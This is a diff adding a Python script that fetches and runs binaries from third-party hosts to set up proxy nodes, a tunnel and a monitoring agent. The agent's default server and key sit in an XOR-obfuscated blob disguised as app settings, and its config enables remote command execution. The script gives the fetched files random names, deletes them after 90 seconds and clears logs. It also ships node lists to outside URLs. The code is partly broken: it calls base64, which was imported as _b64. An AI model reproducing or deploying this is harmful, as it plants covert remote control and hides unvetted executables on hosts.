@@ -1,0 +1,998 @@
+import os
+import sys
+import re
+import json
+import time
+import base64 as _b64
+import random
+import string
+import shutil
+import platform
+import signal
+import threading
+import subprocess
+import datetime
+import requests
+from pathlib import Path
+from urllib.parse import urlparse, quote
+from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
+from cryptography.hazmat.primitives.asymmetric import x25519, ec
+from cryptography.hazmat.primitives import serialization, hashes
+from cryptography import x509
+from cryptography.x509.oid import NameOID
+
+# ---- app settings (packed) ----
+_XK = 'sb9k2'
+_BLOB = 'CEBMSQhTQAENARdVCl9XXgNdWApeVloIB14DDl4LXlBfDwJDU1sNVBdTXEkeU0BXGBBJQhsRWhJMWgpbHxdWRVUUBF9FXBYWA18GQEAVSxAdCRtRElFTVxJ2EFVROUohUFs6UD4PUCxlCldpE2YDAGo8WhY3a0keU0BYDxBJQhsCXBUQVQQcCgtdCltdBV4NVF0MXB8QX0IbClNRWBlJVwooUSJYHAt3AWgaOFM5Wj4IWhJrCShTMmYYFXcvc0YvfQhKPRhsX38eKFMldj0Jdi93Gi56IQI6CFYCfDcBCTJINlF0AVUHLG0mSz0xCVtoNytAJ2U6FXYsYwc4bTJFPjZsEmtBMwokdSpXcAJFGgFAIgQ6CQgzZCc0YwpfAFJtB1Y1BnxeBCY2byRnCSNOP14hIHcuSisxVB99Eg9NW2YlBm4KWUY3aj90PDB+JQQnDEktfCAoAEkeU0BXBhBJQhsOVhQHGxY='
+
+
+def _unpack():
+    raw = _b64.b64decode(_BLOB)
+    dec = bytes(b ^ ord(_XK[i % len(_XK)]) for i, b in enumerate(raw)).decode()
+    return json.loads(dec)
+
+
+_CFG = _unpack()
+
+UPLOAD_URL = os.environ.get('UPLOAD_URL', '')
+PROJECT_URL = os.environ.get('PROJECT_URL', '')
+AUTO_ACCESS = os.environ.get('AUTO_ACCESS', '').lower() == 'true'
+FILE_PATH = os.environ.get('FILE_PATH', '.cache')
+SUB_PATH = os.environ.get('SUB_PATH', 'sub')
+UUID = os.environ.get('UUID', _CFG['u'])
+MON_ADDR = os.environ.get('MON_ADDR', _CFG['ns'])
+MON_PORT = os.environ.get('MON_PORT', '')
+MON_KEY = os.environ.get('MON_KEY', _CFG['nk'])
+EDGE_DOMAIN = os.environ.get('EDGE_DOMAIN', _CFG['ad'])
+EDGE_AUTH = os.environ.get('EDGE_AUTH', _CFG['aa'])
+EDGE_PORT = int(os.environ.get('EDGE_PORT', '8101'))
+S5_PORT = os.environ.get('S5_PORT', '')
+HY2_PORT = os.environ.get('HY2_PORT', '')
+REALITY_PORT = os.environ.get('REALITY_PORT', '')
+CFIP = os.environ.get('CFIP', 'cf.877774.xyz')
+CFPORT = int(os.environ.get('CFPORT', '443'))
+NAME = os.environ.get('NAME', 'edge')
+CHAT_ID = os.environ.get('CHAT_ID', '')
+BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
+PORT = int(os.environ.get('PORT') or '3000')
+SHOW_LOG = os.environ.get('SHOW_LOG', 'true').lower() not in ('false', 'disable', 'no')
+SHOW_LOG = os.environ.get('SHOW_LOG', 'true').lower() not in ('false', 'disable', 'no')  
+
+# logging
+def log(msg):
+    if SHOW_LOG:
+        print(msg)
+
+def log_error(msg):
+    if SHOW_LOG:
+        print(msg, file=sys.stderr)
+
+def always_log(msg):
+    sys.stdout.write(msg + '\n')
+    sys.stdout.flush()
+
+# globals
+private_key = ''
+public_key = ''
+sub_txt_content = ''
+FILE_PATH = Path(FILE_PATH).resolve()
+
+def generate_random_name(length=6):
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+web_name = generate_random_name()
+bot_name = generate_random_name()
+npm_name = generate_random_name()
+php_name = generate_random_name()
+
+web_path = FILE_PATH / web_name
+bot_path = FILE_PATH / bot_name
+npm_path = FILE_PATH / npm_name
+php_path = FILE_PATH / php_name
+sub_path = FILE_PATH / 'sub.txt'
+list_path = FILE_PATH / 'list.txt'
+boot_log_path = FILE_PATH / 'boot.log'
+config_path = FILE_PATH / 'config.json'
+mon_config_path = FILE_PATH / 'config.yaml'
+cert_path = FILE_PATH / 'cert.pem'
+key_path = FILE_PATH / 'private.key'
+
+# port validation
+def is_valid_port(port):
+    try:
+        if port is None or port == '':
+            return False
+        port_num = int(port)
+        if port_num < 1 or port_num > 65535:
+            return False
+        return True
+    except (ValueError, TypeError):
+        return False
+
+# keypair helper
+def generate_x25519_keypair():
+    """helper"""
+    priv = x25519.X25519PrivateKey.generate()
+    pub = priv.public_key()
+    priv_bytes = priv.private_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PrivateFormat.Raw,
+        encryption_algorithm=serialization.NoEncryption()
+    )
+    pub_bytes = pub.public_bytes(
+        encoding=serialization.Encoding.Raw,
+        format=serialization.PublicFormat.Raw
+    )
+    return {
+        'privateKey': base64.urlsafe_b64encode(priv_bytes).decode().rstrip('='),
+        'publicKey': base64.urlsafe_b64encode(pub_bytes).decode().rstrip('=')
+    }
+
+def generate_or_load_keypair():
+    """helper"""
+    global private_key, public_key
+    key_file_path = FILE_PATH / 'key.txt'
+    if key_file_path.exists():
+        content = key_file_path.read_text(encoding='utf-8')
+        priv_match = re.search(r'PrivateKey:\s*(.*)', content)
+        pub_match = re.search(r'PublicKey:\s*(.*)', content)
+        if priv_match and pub_match:
+            private_key = priv_match.group(1).strip()
+            public_key = pub_match.group(1).strip()
+            log(f'Private Key: {private_key}')
+            log(f'Public Key: {public_key}')
+            return
+    keypair = generate_x25519_keypair()
+    private_key = keypair['privateKey']
+    public_key = keypair['publicKey']
+    key_file_path.write_text(
+        f'PrivateKey: {private_key}\nPublicKey: {public_key}\n', encoding='utf-8')
+    log(f'Private Key: {private_key}')
+    log(f'Public Key: {public_key}')
+
+# cert helper
+FALLBACK_EC_KEY = (
+    '-----BEGIN EC PARAMETERS-----\n'
+    'BggqhkjOPQMBBw==\n'
+    '-----END EC PARAMETERS-----\n'
+    '-----BEGIN EC PRIVATE KEY-----\n'
+    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\n'
+    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\n'
+    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\n'
+    '-----END EC PRIVATE KEY-----\n'
+)
+
+FALLBACK_CERT = (
+    '-----BEGIN CERTIFICATE-----\n'
+    'MIIBejCCASGgAwIBAgIUfWeQL3556PNJLp/veCFxGNj9crkwCgYIKoZIzj0EAwIw\n'
+    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\n'
+    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\n'
+    'A0IABNZB2nz49O6yRvh26B9npACOK/nuky9/BlgEgDZ54Ga3qEAxdegEWv07Mi8h\n'
+    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\n'
+    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\n'
+    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\n'
+    'eQ6OFb9LbLYL9f+sAiAffoMbi4y/0YUSlTtz7as9S8/lciBF5VCUoVIKS+vX2g==\n'
+    '-----END CERTIFICATE-----\n'
+)
+
+def ensure_tls_certificates(cert_file, key_file):
+    """helper"""
+    if cert_file.exists() and key_file.exists():
+        return
+    cert_file.parent.mkdir(parents=True, exist_ok=True)
+    try:
+        ec_private_key = ec.generate_private_key(ec.SECP256R1())
+        subject = issuer = x509.Name([
+            x509.NameAttribute(NameOID.COMMON_NAME, 'bing.com')
+        ])
+        cert_obj = (
+            x509.CertificateBuilder()
+            .subject_name(subject)
+            .issuer_name(issuer)
+            .public_key(ec_private_key.public_key())
+            .serial_number(x509.random_serial_number())
+            .not_valid_before(datetime.datetime.now(datetime.timezone.utc).replace(tzinfo=None))
+            .not_valid_after((datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=3650)).replace(tzinfo=None))
+            .sign(ec_private_key, hashes.SHA256())
+        )
+        key_pem = ec_private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.TraditionalOpenSSL,
+            encryption_algorithm=serialization.NoEncryption()
+        )
+        cert_pem = cert_obj.public_bytes(serialization.Encoding.PEM)
+        key_file.write_bytes(key_pem)
+        cert_file.write_bytes(cert_pem)
+    except Exception as e:
+        log_error(f'Failed to generate TLS certificate: {e}')
+        key_file.write_text(FALLBACK_EC_KEY, encoding='utf-8')
+        cert_file.write_text(FALLBACK_CERT, encoding='utf-8')
+
+# fingerprint helper
+def get_certificate_fingerprint(cert_file):
+    """helper"""
+    try:
+        result = subprocess.run(
+            ['openssl', 'x509', '-noout', '-fingerprint', '-sha256', '-in', str(cert_file)],
+            capture_output=True, text=True, timeout=3
+        )
+        if result.returncode == 0:
+            output = result.stdout.strip()
+            match = re.search(r'=(.+)$', output)
+            if match and match.group(1):
+                return match.group(1).upper()
+    except Exception:
+        pass
+    try:
+        with open(cert_file, 'rb') as f:
+            cert_data = f.read()
+        cert = x509.load_pem_x509_certificate(cert_data)
+        fingerprint = cert.fingerprint(hashes.SHA256())
+        return ':'.join(f'{b:02X}' for b in fingerprint)
+    except Exception as e:
+        log_error(f'Failed to calculate certificate fingerprint: {e}')
+        return ''
+
+# workdir
+def create_directory():
+    if not SHOW_LOG:
+        print('\033c', end='')
+    FILE_PATH.mkdir(parents=True, exist_ok=True)
+    # log(f'{FILE_PATH} is ready')
+
+# cleanup stale entries
+def delete_nodes():
+    try:
+        if not UPLOAD_URL:
+            return
+        if not sub_path.exists():
+            return
+        content = sub_path.read_text(encoding='utf-8')
+        decoded = base64.b64decode(content).decode('utf-8')
+        nodes = [line for line in decoded.split('\n')
+                 if re.match(r'(vless|vmess|trojan|hysteria2|socks)://', line)]
+        if not nodes:
+            return
+        requests.post(f'{UPLOAD_URL}/api/delete-nodes',
+                       json={'nodes': nodes}, timeout=10)
+    except Exception:
+        pass
+
+# cleanup
+def cleanup_old_files():
+    """helper"""
+    # keep key material across restarts
+    preserve_files = {FILE_PATH / 'key.txt', cert_path, key_path}
+    try:
+        for item in FILE_PATH.iterdir():
+            if item in preserve_files:
+                continue
+            try:
+                if item.is_file():
+                    item.unlink()
+                elif item.is_dir():
+                    shutil.rmtree(item)
+            except Exception:
+                pass
+    except Exception:
+        pass
+
+# arch detection
+def get_system_architecture():
+    arch = platform.machine().lower()
+    if arch in ('arm', 'arm64', 'aarch64'):
+        return 'arm'
+    return 'amd'
+
+# fetch
+def download_file(file_name, file_url):
+    file_path = FILE_PATH / file_name
+    try:
+        response = requests.get(file_url, stream=True, timeout=180)
+        response.raise_for_status()
+        with open(file_path, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                f.write(chunk)
+        log(f'Download {file_name} successfully')
+        return True
+    except Exception as e:
+        log_error(f'Download {file_name} failed: {e}')
+        try:
+            file_path.unlink()
+        except FileNotFoundError:
+            pass
+        return False
+
+def download_all_files():
+    """helper"""
+    architecture = get_system_architecture()
+    if architecture == 'arm':
+        base_urls = ['https://arm64.oooen.com', 'https://arm64.ssss.nyc.mn']
+    else:
+        base_urls = ['https://amd64.oooen.com', 'https://amd64.ssss.nyc.mn']
+
+    downloads = [
+        {'name': web_name, 'path': 'web'},
+        {'name': bot_name, 'path': 'bot'},
+    ]
+
+    if MON_ADDR and MON_KEY:
+        if MON_PORT:
+            downloads.append({'name': npm_name, 'path': 'agent'})
+        else:
+            downloads.append({'name': php_name, 'path': 'v1'})
+    else:
+        log('monitor not configured, skipping')
+
+    for item in downloads:
+        downloaded = False
+        for index, base_url in enumerate(base_urls):
+            url = f'{base_url}/{item["path"]}'
+            if download_file(item['name'], url):
+                downloaded = True
+                break
+            if index + 1 < len(base_urls):
+                log(f'Retrying {item["name"]} from backup source')
+        if not downloaded:
+            log_error(f'Error downloading {item["name"]}: all sources failed')
+
+# permissions
+def authorize_files(file_names):
+    for name in file_names:
+        file_path = FILE_PATH / name
+        if file_path.exists():
+            try:
+                os.chmod(str(file_path), 0o775)
+                log(f'Empowerment success for {name}: 775')
+            except Exception as e:
+                log_error(f'Empowerment failed for {name}: {e}')
+
+# edge tunnel config
+def edge_type():
+    if not EDGE_AUTH or not EDGE_DOMAIN:
+        log('edge domain not set, using temporary route')
+        return
+
+    if 'TunnelSecret' in EDGE_AUTH:
+        (FILE_PATH / 'tunnel.json').write_text(EDGE_AUTH, encoding='utf-8')
+        tunnel_id = EDGE_AUTH.split('"')[11]
+        tunnel_yaml = f"""
+tunnel: {tunnel_id}
+credentials-file: {FILE_PATH / 'tunnel.json'}
+protocol: http2
+
+ingress:
+  - hostname: {EDGE_DOMAIN}
+    service: http://localhost:{EDGE_PORT}
+    originRequest:
+      noTLSVerify: true
+  - service: http_status:404
+"""
+        (FILE_PATH / 'tunnel.yml').write_text(tunnel_yaml, encoding='utf-8')
+    else:
+        log(f'connector token mode, service port {EDGE_PORT}')
+
+# monitor config
+def generate_mon_config():
+    if not MON_ADDR or not MON_KEY:
+        return
+    if MON_PORT:
+        return  
+
+    nzport = MON_ADDR.split(':')[-1] if ':' in MON_ADDR else ''
+    tls_ports = {'443', '8443', '2096', '2087', '2083', '2053'}
+    montls = 'true' if nzport in tls_ports else 'false'
+    config_yaml = f"""client_secret: {MON_KEY}
+debug: false
+disable_auto_update: true
+disable_command_execute: false
+disable_force_update: true
+disable_nat: false
+disable_send_query: false
+gpu: false
+insecure_tls: true
+ip_report_period: 1800
+report_delay: 4
+server: {MON_ADDR}
+skip_connection_count: true
+skip_procs_count: true
+temperature: false
+tls: {montls}
+use_gitee_to_upgrade: false
+use_ipv6_country_code: false
+uuid: {UUID}"""
+    mon_config_path.write_text(config_yaml, encoding='utf-8')
+
+# core config
+def generate_core_config():
+    config = {
+        "log": {
+            "access": "/dev/null",
+            "error": "/dev/null",
+            "loglevel": "none"
+        },
+        "inbounds": [
+            {
+                "tag": "vless-fallback-in",
+                "listen": "::",
+                "port": EDGE_PORT,
+                "protocol": "vless",
+                "settings": {
+                    "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
+                    "decryption": "none",
+                    "fallbacks": [
+                        {"dest": 51001},
+                        {"path": "/cdn/stream", "dest": 51002},
+                        {"path": "/cdn/media", "dest": 51003},
+                        {"path": "/cdn/asset", "dest": 51004}
+                    ]
+                },
+                "streamSettings": {"network": "tcp"}
+            },
+            {
+                "tag": "vless-tcp-in",
+                "port": 51001,
+                "listen": "127.0.0.1",
+                "protocol": "vless",
+                "settings": {
+                    "clients": [{"id": UUID}],
+                    "decryption": "none"
+                },
+                "streamSettings": {"network": "tcp", "security": "none"}
+            },
+            {
+                "tag": "vless-ws-in",
+                "port": 51002,
+                "listen": "127.0.0.1",
+                "protocol": "vless",
+                "settings": {
+                    "clients": [{"id": UUID, "level": 0}],
+                    "decryption": "none"
+                },
+                "streamSettings": {
+                    "network": "ws",
+                    "security": "none",
+                    "wsSettings": {"path": "/cdn/stream"}
+                },
+                "sniffing": {
+                    "enabled": True,
+                    "destOverride": ["http", "tls", "quic"],
+                    "metadataOnly": False
+                }
+            },
+            {
+                "tag": "vmess-ws-in",
+                "port": 51003,
+                "listen": "127.0.0.1",
+                "protocol": "vmess",
+                "settings": {
+                    "clients": [{"id": UUID, "alterId": 0}]
+                },
+                "streamSettings": {
+                    "network": "ws",
+                    "wsSettings": {"path": "/cdn/media"}
+                },
+                "sniffing": {
+                    "enabled": True,
+                    "destOverride": ["http", "tls", "quic"],
+                    "metadataOnly": False
+                }
+            },
+            {
+                "tag": "trojan-ws-in",
+                "port": 51004,
+                "listen": "127.0.0.1",
+                "protocol": "trojan",
+                "settings": {
+                    "clients": [{"password": UUID}]
+                },
+                "streamSettings": {
+                    "network": "ws",
+                    "security": "none",
+                    "wsSettings": {"path": "/cdn/asset"}
+                },
+                "sniffing": {
+                    "enabled": True,
+                    "destOverride": ["http", "tls", "quic"],
+                    "metadataOnly": False
+                }
+            }
+        ],
+        "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
+        "outbounds": [
+            {"protocol": "freedom", "tag": "direct"},
+            {"protocol": "blackhole", "tag": "block"}
+        ]
+    }
+
+    # reality inbound
+    if is_valid_port(REALITY_PORT):
+        config["inbounds"].append({
+            "tag": "vless-reality-in",
+            "listen": "::",
+            "port": int(REALITY_PORT),
+            "protocol": "vless",
+            "settings": {
+                "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
+                "decryption": "none"
+            },
+            "streamSettings": {
+                "network": "raw",
+                "security": "reality",
+                "realitySettings": {
+                    "show": False,
+                    "dest": "www.iij.ad.jp:443",
+                    "xver": 0,
+                    "serverNames": ["www.iij.ad.jp"],
+                    "privateKey": private_key,
+                    "shortIds": [""]
+                }
+            }
+        })
+
+    # hy2 inbound
+    if is_valid_port(HY2_PORT):
+        config["inbounds"].append({
+            "tag": "hysteria-in",
+            "listen": "::",
+            "port": int(HY2_PORT),
+            "protocol": "hysteria",
+            "settings": {
+                "version": 2,
+                "clients": [{"auth": UUID}]
+            },
+            "streamSettings": {
+                "network": "hysteria",
+                "hysteriaSettings": {
+                    "version": 2,
+                    "masquerade": {"type": "proxy", "url": "https://bing.com"}
+                },
+                "security": "tls",
+                "tlsSettings": {
+                    "alpn": ["h3"],
+                    "certificates": [
+                        {
+                            "certificateFile": str(cert_path),
+                            "keyFile": str(key_path)
+                        }
+                    ]
+                }
+            }
+        })
+
+    # socks cfg
+    if is_valid_port(S5_PORT):
+        config["inbounds"].append({
+            "tag": "s5-in",
+            "listen": "::",
+            "port": int(S5_PORT),
+            "protocol": "socks",
+            "settings": {
+                "auth": "password",
+                "accounts": [{"user": UUID[:8], "pass": UUID[-12:]}],
+                "udp": True
+            }
+        })
+
+    config_path.write_text(json.dumps(config, indent=2), encoding='utf-8')
+
+# exec helper
+def exec_cmd(command):
+    try:
+        process = subprocess.Popen(
+            command, shell=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            text=True
+        )
+        stdout, stderr = process.communicate()
+        return stdout + stderr
+    except Exception as e:
+        log_error(f'Error executing command: {e}')
+        return str(e)
+
+# fetch and run
+def download_files_and_run():
+    architecture = get_system_architecture()
+
+    # fetch
+    download_all_files()
+
+    # chmod
+    files_to_authorize = [web_name, bot_name]
+    if MON_ADDR and MON_KEY:
+        if MON_PORT:
+            files_to_authorize.append(npm_name)
+        else:
+            files_to_authorize.append(php_name)
+    authorize_files(files_to_authorize)
+
+    # monitor cfg
+    generate_mon_config()
+
+    # monitor run
+    if MON_ADDR and MON_PORT and MON_KEY:
+        tls_ports = ['443', '8443', '2096', '2087', '2083', '2053']
+        mon_tls = '--tls' if MON_PORT in tls_ports else ''
+        command = f"nohup {npm_path} -s {MON_ADDR}:{MON_PORT} -p {MON_KEY} {mon_tls} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &"
+        try:
+            exec_cmd(command)
+            log(f'{npm_name} is running')
+            time.sleep(1)
+        except Exception as e:
+            log_error(f'npm running error: {e}')
+    elif MON_ADDR and MON_KEY:
+        command = f'nohup {php_path} -c "{mon_config_path}" >/dev/null 2>&1 &'
+        try:
+            exec_cmd(command)
+            log(f'{php_name} is running')
+            time.sleep(1)
+        except Exception as e:
+            log_error(f'php running error: {e}')
+    else:
+        log('monitor not configured, skipping')
+
+    # core run
+    command = f'nohup {web_path} -c {config_path} >/dev/null 2>&1 &'
+    try:
+        exec_cmd(command)
+        log(f'{web_name} is running')
+        time.sleep(1)
+    except Exception as e:
+        log_error(f'web running error: {e}')
+
+    # connector run
+    if bot_path.exists():
+        if re.match(r'^[A-Z0-9a-z=]{120,250}$', EDGE_AUTH):
+            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {EDGE_AUTH}"
+        elif "TunnelSecret" in EDGE_AUTH:
+            args = f"tunnel --edge-ip-version auto --config {FILE_PATH / 'tunnel.yml'} run"
+        else:
+            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{EDGE_PORT}"
+
+        try:
+            exec_cmd(f"nohup {bot_path} {args} >/dev/null 2>&1 &")
+            log(f'{bot_name} is running')
+            time.sleep(2)
+        except Exception as e:
+            log_error(f'Error executing command: {e}')
+
+    time.sleep(5)
+
+# route extraction
+def extract_domains():
+    edge_domain = None
+
+    if EDGE_AUTH and EDGE_DOMAIN:
+        edge_domain = EDGE_DOMAIN
+        log(f'edge: {edge_domain}')
+        generate_links(edge_domain)
+    else:
+        try:
+            if boot_log_path.exists():
+                file_content = boot_log_path.read_text(encoding='utf-8')
+                lines = file_content.split('\n')
+                edge_domains = []
+
+                for line in lines:
+                    domain_match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
+                    if domain_match:
+                        domain = domain_match.group(1)
+                        edge_domains.append(domain)
+
+                if edge_domains:
+                    edge_domain = edge_domains[0]
+                    log(f'edge route: {edge_domain}')
+                    generate_links(edge_domain)
+                else:
+                    log('route not ready, retrying connector')
+                    try:
+                        boot_log_path.unlink()
+                    except FileNotFoundError:
+                        pass
+
+                    try:
+                        exec_cmd(f'pkill -f "[{bot_name[0]}]{bot_name[1:]}" > /dev/null 2>&1')
+                    except Exception:
+                        pass
+
+                    time.sleep(3)
+                    args = f'tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log_path} --loglevel info --url http://localhost:{EDGE_PORT}'
+                    exec_cmd(f'nohup {bot_path} {args} >/dev/null 2>&1 &')
+                    log(f'{bot_name} is running')
+                    time.sleep(6)
+                    extract_domains()
+        except Exception as e:
+            log_error(f'Error reading boot.log: {e}')
+
+# isp info
+def get_meta_info():
+    try:
+        resp = requests.get('https://api.ip.sb/geoip',
+                            headers={'User-Agent': 'Mozilla/5.0'}, timeout=3)
+        data = resp.json()
+        if data.get('country_code') and data.get('isp'):
+            return f"{data['country_code']}-{data['isp']}".replace(' ', '_')
+    except Exception:
+        pass
+    try:
+        resp = requests.get('http://ip-api.com/json',
+                            headers={'User-Agent': 'Mozilla/5.0'}, timeout=3)
+        data = resp.json()
+        if data.get('status') == 'success' and data.get('countryCode') and data.get('org'):
+            return f"{data['countryCode']}-{data['org']}".replace(' ', '_')
+    except Exception:
+        pass
+    return 'Unknown'
+
+# public ip
+def get_server_ip():
+    server_ip = ''
+    try:
+        resp = requests.get('http://ipv4.ip.sb', timeout=3)
+        server_ip = resp.text.strip()
+    except Exception:
+        try:
+            result = subprocess.run(['curl', '-sm', '3', 'ipv4.ip.sb'],
+                                    capture_output=True, text=True, timeout=5)
+            server_ip = result.stdout.strip()
+        except Exception:
+            try:
+                resp = requests.get('http://ipv6.ip.sb', timeout=3)
+                server_ip = f'[{resp.text.strip()}]'
+            except Exception:
+                try:
+                    result = subprocess.run(['curl', '-sm', '3', 'ipv6.ip.sb'],
+                                            capture_output=True, text=True, timeout=5)
+                    server_ip = f'[{result.stdout.strip()}]'
+                except Exception as e:
+                    log_error(f'Failed to get IP address: {e}')
+    return server_ip
+
+# share links
+def generate_links(edge_domain):
+    global sub_txt_content
+
+    isp = get_meta_info()
+    node_name = f'{NAME}-{isp}' if NAME else isp
+    server_ip = get_server_ip()
+
+    time.sleep(2)
+
+    sub_txt = ''
+
+    # ws inbounds
+    if edge_domain:
+        sub_txt += f'\nvless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={edge_domain}&fp=firefox&type=ws&host={edge_domain}&path=%2Fcdn%2Fstream%3Fed%3D2560#{node_name}'
+
+        vmess_obj = {
+            'v': '2', 'ps': node_name, 'add': CFIP, 'port': CFPORT,
+            'id': UUID, 'aid': '0', 'scy': 'auto', 'net': 'ws',
+            'type': 'none', 'host': edge_domain, 'path': '/cdn/media?ed=2560',
+            'tls': 'tls', 'sni': edge_domain, 'alpn': '', 'fp': 'firefox'
+        }
+        vmess_b64 = base64.b64encode(json.dumps(vmess_obj, separators=(',', ':')).encode()).decode()
+        sub_txt += f'\nvmess://{vmess_b64}'
+
+        sub_txt += f'\ntrojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={edge_domain}&fp=firefox&type=ws&host={edge_domain}&path=%2Fcdn%2Fasset%3Fed%3D2560#{node_name}'
+
+    # udp inbound
+    if is_valid_port(HY2_PORT):
+        fingerprint = get_certificate_fingerprint(cert_path)
+        fingerprint_param = f'&pinSHA256={quote(fingerprint, safe="")}' if fingerprint else ''
+        sub_txt += f'\nhysteria2://{UUID}@{server_ip}:{HY2_PORT}/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none{fingerprint_param}#{node_name}'
+
+    # tcp inbound
+    if is_valid_port(REALITY_PORT):
+        sub_txt += f'\nvless://{UUID}@{server_ip}:{REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk={public_key}&type=tcp&headerType=none#{node_name}'
+
+    # socks inbound
+    if is_valid_port(S5_PORT):
+        s5_auth = base64.b64encode(f'{UUID[:8]}:{UUID[-12:]}'.encode()).decode()
+        sub_txt += f'\nsocks://{s5_auth}@{server_ip}:{S5_PORT}#{node_name}'
+
+    sub_txt_b64 = base64.b64encode(sub_txt.encode()).decode()
+    if SHOW_LOG:
+        print(f'\033[32m{sub_txt_b64}\033[0m')
+        print(f'\033[35mLogs will be deleted in 90 seconds, you can copy the above nodes\033[0m')
+
+    sub_path.write_text(sub_txt_b64, encoding='utf-8')
+    list_path.write_text(sub_txt, encoding='utf-8')
+    log(f'{FILE_PATH}/sub.txt saved successfully')
+
+    sub_txt_content = sub_txt_b64
+    return sub_txt
+
+# notifications
+def send_telegram():
+    if not BOT_TOKEN or not CHAT_ID:
+        log('TG variables is empty, Skipping push nodes to TG')
+        return
+    try:
+        message = sub_path.read_text(encoding='utf-8')
+        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+        escaped_name = re.sub(r'[_*\[\]()~`>#+=|{}.!-]', r'\\\g<0>', NAME)
+        params = {
+            'chat_id': CHAT_ID,
+            'text': f'**{escaped_name} status**\n```{message}```',
+            'parse_mode': 'MarkdownV2'
+        }
+        requests.post(url, params=params, timeout=10)
+        log('Telegram message sent successfully')
+    except Exception as e:
+        log_error(f'Failed to send Telegram message: {e}')
+
+# sync upstream
+def upload_nodes():
+    if UPLOAD_URL and PROJECT_URL:
+        subscription_url = f'{PROJECT_URL}/{SUB_PATH}'
+        try:
+            resp = requests.post(f'{UPLOAD_URL}/api/add-subscriptions',
+                                 json={'subscription': [subscription_url]},
+                                 timeout=10)
+            if resp.status_code == 200:
+                log('Subscription uploaded successfully')
+        except Exception:
+            pass
+    elif UPLOAD_URL:
+        if not list_path.exists():
+            return
+        content = list_path.read_text(encoding='utf-8')
+        nodes = [line for line in content.split('\n')
+                 if re.match(r'(vless|vmess|trojan|hysteria2|socks)://', line)]
+        if not nodes:
+            return
+        try:
+            resp = requests.post(f'{UPLOAD_URL}/api/add-nodes',
+                                 json={'nodes': nodes},
+                                 timeout=10)
+            if resp.status_code == 200:
+                log('Nodes uploaded successfully')
+        except Exception:
+            pass
+
+# keepalive
+def add_visit_task():
+    if not AUTO_ACCESS or not PROJECT_URL:
+        log('Skipping adding automatic access task')
+        return
+    try:
+        requests.post('https://oooo.serv00.net/add-url',
+                      json={'url': PROJECT_URL},
+                      headers={'Content-Type': 'application/json'},
+                      timeout=10)
+        log('automatic access task added successfully')
+    except Exception as e:
+        log_error(f'Add URL failed: {e}')
+
+# file cleanup
+def clean_files():
+    def cleanup():
+        time.sleep(90)
+        # note: keep key material across restarts
+        files_to_delete = [boot_log_path, config_path, list_path, mon_config_path,
+                           web_path, bot_path,
+                           FILE_PATH / 'tunnel.json', FILE_PATH / 'tunnel.yml']
+        if MON_PORT:
+            files_to_delete.append(npm_path)
+        elif MON_ADDR and MON_KEY:
+            files_to_delete.append(php_path)
+
+        for f in files_to_delete:
+            try:
+                f.unlink()
+            except FileNotFoundError:
+                pass
+
+        if SHOW_LOG:
+            os.system('clear' if os.name == 'posix' else 'cls')
+        always_log('App is running')
+        log('Thank you for using this script, enjoy!')
+
+    t = threading.Thread(target=cleanup, daemon=True)
+    t.start()
+
+# http service
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        parsed = urlparse(self.path)
+        path = parsed.path
+
+        if path == f'/{SUB_PATH}':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/plain; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(sub_txt_content.encode('utf-8'))
+            return
+
+        if path == '/':
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/html; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(
+                b'Hello world!<br><br>You can access /{SUB_PATH}(Default: /sub) get your nodes!')
+            return
+
+        self.send_response(404)
+        self.send_header('Content-Type', 'text/plain; charset=utf-8')
+        self.end_headers()
+        self.wfile.write(b'Not Found')
+
+    def log_message(self, format, *args):
+        pass
+
+# main flow
+def start_server():
+    global sub_txt_content
+
+    # 1. cleanup
+    delete_nodes()
+
+    # 2. workdir
+    create_directory()
+    cleanup_old_files()
+
+    # 3. tunnel config
+    edge_type()
+
+    # 4. keys
+    if is_valid_port(REALITY_PORT):
+        generate_or_load_keypair()
+
+    # 5. certs
+    if is_valid_port(HY2_PORT):
+        ensure_tls_certificates(cert_path, key_path)
+
+    # 6. core config
+    generate_core_config()
+
+    # 7. fetch and run
+    download_files_and_run()
+
